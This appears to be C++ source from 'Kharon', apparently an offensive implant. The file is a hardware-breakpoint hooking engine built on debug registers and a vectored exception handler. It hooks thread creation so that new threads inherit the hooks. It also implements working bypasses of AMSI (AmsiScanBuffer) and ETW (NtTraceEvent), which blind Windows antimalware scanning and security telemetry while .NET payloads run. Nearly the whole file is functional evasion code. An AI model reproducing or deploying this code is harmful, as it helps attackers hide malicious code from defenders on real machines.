#include <Kharon.h>

auto DECLFN HwbpEng::SetDr7(
    _In_ UPTR ActVal,
    _In_ UPTR NewVal,
    _In_ INT  StartPos,
    _In_ INT  BitsCount
) -> UPTR {
    if (StartPos < 0 || BitsCount <= 0 || StartPos + BitsCount > 64) {
        return ActVal;
    }
    
    UPTR Mask = (1ULL << BitsCount) - 1ULL;
    return (ActVal & ~(Mask << StartPos)) | ((NewVal & Mask) << StartPos);
}

auto DECLFN HwbpEng::Install(
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ PVOID Callback,
    _In_ ULONG ThreadID
) -> BOOL {
    if ( Drx < 0 || Drx > 3 ) return FALSE;

    PDESCRIPTOR_HOOK NewEntry = (PDESCRIPTOR_HOOK)Self->Hp->Alloc( sizeof(DESCRIPTOR_HOOK) );
    if ( !NewEntry ) return FALSE;

    NewEntry->Drx      = Drx;
    NewEntry->ThreadID = ThreadID;
    NewEntry->Address  = Address;
    NewEntry->Detour   = (decltype(NewEntry->Detour))Callback;
    NewEntry->This     = Self;
    NewEntry->Next     = nullptr;
    NewEntry->Prev     = nullptr;

    Self->Ntdll.RtlEnterCriticalSection( CritSec );

    if ( !Threads ) {
        Threads = NewEntry;
    } else {
        PDESCRIPTOR_HOOK Current = Threads;

        while (Current->Next) {
            Current = Current->Next;
        }

        Current->Next  = NewEntry;
        NewEntry->Prev = Current;
    }

    Self->Ntdll.RtlLeaveCriticalSection( CritSec );

    return this->Insert(Address, Drx, TRUE, ThreadID);
}

auto DECLFN HwbpEng::SetBreak(
    _In_ ULONG ThreadID,
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ BOOL  Init
) -> BOOL {
    if (Drx < 0 || Drx > 3) return FALSE;

    CONTEXT  Ctx    = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE   Handle = INVALID_HANDLE_VALUE;
    NTSTATUS Status = STATUS_SUCCESS;

    if ( ThreadID != Self->Session.ThreadID ) {
        Handle = Self->Td->Open( THREAD_ALL_ACCESS, FALSE, ThreadID );
        Status = Self->Ntdll.NtGetContextThread( Handle, &Ctx );
        if ( Handle == INVALID_HANDLE_VALUE ) return FALSE;
    } else {
        Self->Ntdll.RtlCaptureContext( &Ctx );
    }
    
    if ( !NT_SUCCESS( Status) && ThreadID != Self->Session.ThreadID ) {
        if ( Handle != NtCurrentThread() ) Self->Ntdll.NtClose( Handle );
        return FALSE;
    }

    if ( Init ) {
        (&Ctx.Dr0)[Drx] = Address;
        Ctx.Dr7 = this->SetDr7( Ctx.Dr7, 3, (Drx * 2), 2 ); // active breakpoint
    } else {
        (&Ctx.Dr0)[Drx] = 0;
        Ctx.Dr7 = this->SetDr7( Ctx.Dr7, 0, (Drx * 2), 2 ); // desactive breakpoint
    }
    
    if ( Handle != NtCurrentThread() ) {
        Status = Self->Ntdll.NtSetContextThread( Handle, &Ctx );
        Status = Self->Ntdll.NtClose( Handle );
    } else {
        Status = Self->Ntdll.NtContinue( &Ctx, FALSE );
    }

    return NT_SUCCESS( Status );
}

auto DECLFN HwbpEng::Uninstall(
    _In_ UPTR  Address,
    _In_ ULONG ThreadID
) -> BOOL {
    PDESCRIPTOR_HOOK Current = Threads;
    Self->Ntdll.RtlEnterCriticalSection( CritSec );
    ULONG   Flag  = 0;
    INT8    Drx   = -1;
    BOOL    Found = FALSE;

    while ( Current ) {

        PDESCRIPTOR_HOOK Next = Current->Next; 

        if ( Current->Address == Address && Current->ThreadID == ThreadID ) {
            Found = TRUE;
            Drx   = Current->Drx;

            if ( Current == Threads ) {
                Threads = Current->Next;
            }

            if ( Current->Next ) {
                Current->Next->Prev = Current->Prev;
            }

            if ( Current->Prev ) {
                Current->Prev->Next = Current->Next;
            }

            if ( Current ) {
                Self->Hp->Free( Current );
            }
        }

        Current = Next;
    }

    Self->Ntdll.RtlLeaveCriticalSection( CritSec );
    if ( Found ) {
        Flag = Insert( Address, Drx, FALSE, ThreadID );
    }

    return Flag;
}

auto DECLFN HwbpEng::GetArg(
    _In_ PCONTEXT Ctx,
    _In_ ULONG    Idx
) -> UPTR {
#ifdef _WIN64
    switch ( Idx ) {
        case 1: {
            return Ctx->Rcx;
        }
        case 2: {
            return Ctx->Rdx;
        }
        case 3: {
            return Ctx->R8;
        }
        case 4: {
            return Ctx->R9;
        }
    }

    return C_DEF64( Ctx->Rsp + ( Idx * sizeof( PVOID ) ) );
#else
    return DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) );
#endif
}

auto DECLFN HwbpEng::SetArg(
    _In_ PCONTEXT Ctx,
    _In_ UPTR     Val,
    _In_ ULONG    Idx
) -> VOID {
#ifdef _WIN64
switch ( Idx ) {
    case 1: {
        Ctx->Rcx = Val; return;
    }
    case 2: {
        Ctx->Rdx = Val; return;
    }
    case 3: {
        Ctx->R8 = Val; return;
    }
    case 4: {
        Ctx->R9 = Val; return;
    }
}
    C_DEF64( Ctx->Rsp + ( Idx * sizeof( PVOID ) ) ) = Val;
#else
    DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) ) = Val;
#endif
}

auto DECLFN HwbpEng::BlockReal(
    _In_ PCONTEXT Ctx
) -> VOID {
    const unsigned char Ret = { 0xC3 };
#ifdef _WIN64
    Ctx->Rip = (UPTR)&Ret;
#else
    Ctx->Eip = (UPTR)&Ret;
#endif
}

auto DECLFN HwbpEng::Insert(
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ BOOL  Init,
    _In_ ULONG ThreadID
) -> BOOL {
    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };

    ULONG RetLength = 0;
    PVOID TmpValue  = NULL;
    LONG  NtStatus  = STATUS_UNSUCCESSFUL;
    BOOL  Flaged    = FALSE;

    NtStatus = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, nullptr, 0, &RetLength );
    if ( NtStatus != STATUS_INFO_LENGTH_MISMATCH ) return FALSE;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( RetLength );
    if ( !SysProcInfo ) return FALSE;

    TmpValue = (PVOID)SysProcInfo;    

    NtStatus = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, RetLength, &RetLength );
    if ( NtStatus != STATUS_SUCCESS ) return FALSE;

    while ( 1 ) {
        if ( HandleToUlong( SysProcInfo->UniqueProcessId ) == Self->Session.ProcessID ) {

            SysThreadInfo = (PSYSTEM_THREAD_INFORMATION)SysProcInfo->Threads;

            for  ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                if ( ThreadID != HW_ALL_THREADS && ThreadID != HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) ) 
                    continue;

                if ( ! this->SetBreak( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ), Address, Drx, Init ) ) goto _KH_END;
            }

            break;
        }

        if ( !SysProcInfo->NextEntryOffset ) break;

        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
    }

    Flaged = TRUE;
_KH_END:
    if ( TmpValue ) Self->Hp->Free( TmpValue );

    return Flaged;
}

auto DECLFN HwbpEng::Init( VOID ) -> BOOL {
    if ( Initialized ) return TRUE;
    
    CritSec = (RTL_CRITICAL_SECTION*)Self->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( RTL_CRITICAL_SECTION ) );

    if ( !CritSec->DebugInfo ) {

        Self->Ntdll.RtlInitializeCriticalSection( CritSec );

    }

    Handler = Self->Ntdll.RtlAddVectoredExceptionHandler( 
        1, (PVECTORED_EXCEPTION_HANDLER)this->MainThunk
    );


    Self->Ntdll.RtlInitializeCriticalSection( CritSec );
    Initialized = TRUE;

    return TRUE;
}

auto DECLFN HwbpEng::Clean( VOID ) -> BOOL {
    if ( !Initialized ) return TRUE;

    Self->Ntdll.RtlEnterCriticalSection( CritSec );

    PDESCRIPTOR_HOOK Current = Threads;

    while ( Current ) {
        PDESCRIPTOR_HOOK Next = Current->Next; 
        this->Uninstall( Current->Address, Current->ThreadID );

        Current = Next; 
    }

    Self->Ntdll.RtlLeaveCriticalSection( CritSec );

    if ( Handler ) Self->Ntdll.RtlRemoveVectoredExceptionHandler( Handler ); 

    Self->Ntdll.RtlDeleteCriticalSection( CritSec );
    Self->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, CritSec );

    Initialized = FALSE;

    return TRUE;
}

auto DECLFN HwbpEng::MainHandler( 
    _In_ PEXCEPTION_POINTERS e 
) -> LONG {
    BOOL Solutioned = FALSE;
    PDESCRIPTOR_HOOK Current = Threads;

    if ( e->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP ) goto _KH_END;
    Self->Ntdll.RtlEnterCriticalSection( CritSec );
    while ( Current ) {
        if ( Current->Address == e->ContextRecord->Rip && !Current->Processed ) {
            if ( Current->ThreadID != 0 && Current->ThreadID != Self->Session.ThreadID ) {
        
                Current->Processed = TRUE;
            }
    
            if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, FALSE ) ) {
                goto _KH_END;
            }
    
            VOID ( *Detour )( PCONTEXT, PVOID ) = Current->Detour;
            Detour( e->ContextRecord, Self );
    
            if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, TRUE ) ) {
                goto _KH_END;
            }
    
            Current->Processed = TRUE;
        }

        Current->Processed = FALSE;
        Current = Current->Next;
    }

    Self->Ntdll.RtlLeaveCriticalSection( CritSec );
    Solutioned = TRUE;

_KH_END:
    return ( Solutioned ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH );
}

auto DECLFN HwbpEng::HookCallback(
    _In_ PVOID Parameter,
    _In_ BOOL  TimerWait
) -> VOID {
    PDESCRIPTOR_HOOK Current = Threads;
    INT8   i      = 0;
    HANDLE Handle = (HANDLE)( *(HANDLE*)Parameter );
    Self->Ntdll.RtlEnterCriticalSection( CritSec );
    while ( Current ) {
        if ( Current->Address && Current->Detour && Current->ThreadID == HW_ALL_THREADS ) {
            this->Install( Current->Address, Current->Drx, (PVOID)Current->Detour, Current->ThreadID ); i++;     
        }

        if ( i == 4 ) break;

        Current = Current->Next;
    }

    Self->Ntdll.RtlLeaveCriticalSection( CritSec );
    Self->Krnl32.ResumeThread( Handle );
}

auto DECLFN HwbpEng::AddNewThreads(
    _In_ INT8 Drx
) -> BOOL {
    return Install( U_PTR( Self->Ntdll.NtCreateThreadEx ), Drx, (PVOID)this->NtCreateThreadExHkThunk, HW_ALL_THREADS );
}

auto DECLFN HwbpEng::RmNewThreads(
    _In_ INT8 Drx
) -> BOOL {
    return Uninstall( U_PTR( Self->Ntdll.NtCreateThreadEx ), HW_ALL_THREADS );
}

auto DECLFN HwbpEng::NtCreateThreadExHk(
    _In_ PCONTEXT Ctx
) -> VOID {
    HANDLE  Timer  = INVALID_HANDLE_VALUE;
    HANDLE* Handle = (HANDLE*)GET_ARG_1( Ctx );
    ULONG   Flags  = GET_ARG_7( Ctx );
    Flags = Flags | THREAD_CREATE_FLAGS_CREATE_SUSPENDED;

    SET_ARG_7( Ctx, Flags );

    this->HookCallbackArg.Parameter = Handle;
    Self->Ntdll.RtlCreateTimer( 
        &Timer, NULL, reinterpret_cast<WAITORTIMERCALLBACKFUNC>( &this->HookCallbackThunk ), this, 0, 0, 0 
    );

    CONTINUE_EXEC( Ctx );
}

auto DECLFN HwbpEng::NtCreateThreadExHkThunk(
    _In_ PCONTEXT Ctx,
    _In_ PVOID    This 
) -> VOID {
    This = NtCurrentPeb()->TelemetryCoverageHeader;
    return static_cast<Root::Kharon*>( This )->Hw->NtCreateThreadExHk( Ctx );
}

auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
    if( !Init() ) return FALSE;

    BOOL Success = FALSE;

    KhDbg( "%d", this->DotnetBypass );

    // if ( this->DotnetBypass ) {

        if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
            if ( !this->Etw.NtTraceEvent ) {
                this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
                KhDbg("NtTraceEvent %p", this->Etw.NtTraceEvent );
            }

            Success = this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
            if ( ! Success ) return Success;
        }

        KhDbg( "dbg" );

        if ( this->DotnetBypass == KH_BYPASS_AMSI || this->DotnetBypass == KH_BYPASS_ALL ) {
            KhDbg( "%p", this->Amsi.Handle );
            if ( ! this->Amsi.Handle ) {
                KhDbg( "dbg" );
                this->Amsi.Handle = Self->Lib->Load( "amsi.dll" );
                KhDbg( "%p", this->Amsi.Handle );
            }

            if ( this->Amsi.Handle ) {
                KhDbg( "dbg" );
                this->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( this->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
                KhDbg("AmsiScanBuffer %p", this->Amsi.AmsiScanBuffer );
            }

            Success = this->Install( this->Amsi.AmsiScanBuffer, Dr2, (PVOID)this->AmsiThunk, Self->Session.ThreadID );
            if ( ! Success ) return Success;
        }
    // }

    return Success;
}

auto DECLFN HwbpEng::DotnetExit( VOID ) -> BOOL {
    return this->Clean();
}

auto DECLFN HwbpEng::EtwDetour(
    _In_ PCONTEXT Ctx
) -> VOID {
    Ctx->Rip  = *(UPTR*)Ctx->Rsp;
    Ctx->Rsp += sizeof( PVOID );
    Ctx->Rax  = STATUS_SUCCESS;
}

auto DECLFN HwbpEng::AmsiDetour(
    _In_ PCONTEXT Ctx
) -> VOID {
	Ctx->Rdx = (UPTR)Self->Krnl32.GetProcAddress;

    CONTINUE_EXEC( Ctx );
}

auto DECLFN HwbpEng::AmsiThunk(
    _In_ PCONTEXT Ctx,
    _In_ PVOID    This 
) -> VOID {
    static_cast<Root::Kharon*>( This )->Hw->AmsiDetour( Ctx );
}

auto DECLFN HwbpEng::EtwThunk(
    _In_ PCONTEXT Ctx,
    _In_ PVOID    This 
) -> VOID {
    static_cast<Root::Kharon*>( This )->Hw->EtwDetour( Ctx );
}